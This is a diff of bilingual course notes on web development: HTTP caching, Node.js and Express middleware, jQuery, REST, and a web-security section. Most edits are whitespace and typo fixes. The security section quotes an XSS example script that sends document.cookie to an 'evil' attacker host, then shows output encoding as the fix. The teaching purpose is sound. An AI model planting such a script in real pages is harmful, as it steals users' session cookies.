@@ -20,7 +20,7 @@ total = 2RTT+transmit time
 			- an "expiration" mechanism
 		- Eliminate the need to send full responses in many other cases
 			- reduce network bandwidth requirements
-			- a "calidation" mechanism
+			- a "validation" mechanism
 	- level of caches: server side, client side (proxy and browser)
 	- cache correctness:
 		- It has been checked for equivalence with what the origin server would have returned by revalidating the response with the origin server 发送请求给源服务器，问它如果要返回，会返回哪个版本的内容，并与本地对比
@@ -424,7 +424,7 @@ var person = {
 ## week 6 Node.js
 ### general
 - Node.js server runs on a single thread, very light footprint on system resource
-- single threaded execution: 
+- single threaded execution:
 	- Node.js server handles all requests in a **single thread**
 	- JavaScript is designed to run in a single thread, both in browser and on server side
 - multiple theaded execution: thread pool
@@ -478,7 +478,7 @@ var person = {
 			- ```HANDLER```是处理这个请求的方法
 - middleware: software (function) that sits between the application code and some low level API
 	- It has access to the request and response object
-	- ```app.get('/', function(req, res, next){next();});``` 
+	- ```app.get('/', function(req, res, next){next();});```
 	- ```app.use('/', route);``` Route method is also a middleware, most of the time we call it route method or handler.
 	- ```app.use(bodyParser.json()); app.use(bodyParser.urlencoded({extended: true}));```
 	- middleware can do: Execute any code, Make changes to request or response object, End the request-response cycle, Call next in the stack, middleware or route method.
@@ -532,12 +532,12 @@ var person = {
 		- Predefined special types: Date, object id, binary data, regular expression, timestamp...
 - MongoDB 参考 [MongoDB](./mongodb.md)
 ---
-## week 8 
+## week 8
 ---
-	
+
 ### express.js
 
---- 
+---
 ## week9 Client side libraries
 - jQuery
 	- lightweight js library
@@ -553,15 +553,15 @@ var person = {
 	- pseudo selectors:```$("a:visited")``` 所有已经访问过的link
 - 注册event handler
 	- 	```
-		$("p").click(function(){ 
-			action goes here!! 
+		$("p").click(function(){
+			action goes here!!
 		});
 		```
 	- event有：click, dbclick, mouseenter, mouseleave
 - DOM 操作
 	- append 添加到指定节点的末尾
 	- prepend 添加到指定节点的开头
-	- 常用方法： 
+	- 常用方法：
 		- attr: 获得/设置属性("属性名","值")
 		- css: 获得/设置css属性("属性名","值")
 		- html: 获得/设置html内容
@@ -593,7 +593,7 @@ var person = {
 		- UDDI - Universal Description, Discovery and Integration
 		- 原始web service设计： application centric; Web and REST style:  resource centric
 - REST : Representational State Transfer
-	- REST-style architectures consist of clients and servers. 
+	- REST-style architectures consist of clients and servers.
 	- Clients initiate requests to servers; servers process requests and return appropriate responses.
 	- Resource：资源，即数据（前面说过网络的核心）。比如 newsfeed，friends等； Representation：某种表现形式，比如用JSON，XML，JPEG等；
 	- State Transfer：状态变化。通过HTTP动词（GET, POST, PUT, DELETE）实现。
@@ -616,7 +616,7 @@ var person = {
 	- Authorization:
 		- What you can / are allowed to see
 	- Confidentiality:
-		- Maintain the privacy for data you are storing & transferring 
+		- Maintain the privacy for data you are storing & transferring
 	- Data integrity:
 		- Data is accurate & correct
 - Way to achieve security
@@ -695,10 +695,10 @@ var person = {
 	- XSS example: response contains executable script from user input
 		- ```
 			<script>var img = document.createElement(“img”);
-			img.src = 'http://evil.martinfowler.com/steal?' + document.cookie; 
-			</script> 
+			img.src = 'http://evil.martinfowler.com/steal?' + document.cookie;
+			</script>
 			```
-		- This content is assigned to variable "communicationType" which will be sent by code 
+		- This content is assigned to variable "communicationType" which will be sent by code
 			```
 			res.send("Can't send by type " + communicationType));
 			```
@@ -712,13 +712,3 @@ var person = {
 - Output encoding
 	- Unescaped: ```<script> alert(“hello”);</script>```
 	- Escaped: ```&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;```
-		
-		
-		
-		
-		
-		
-		
-		
-		
-
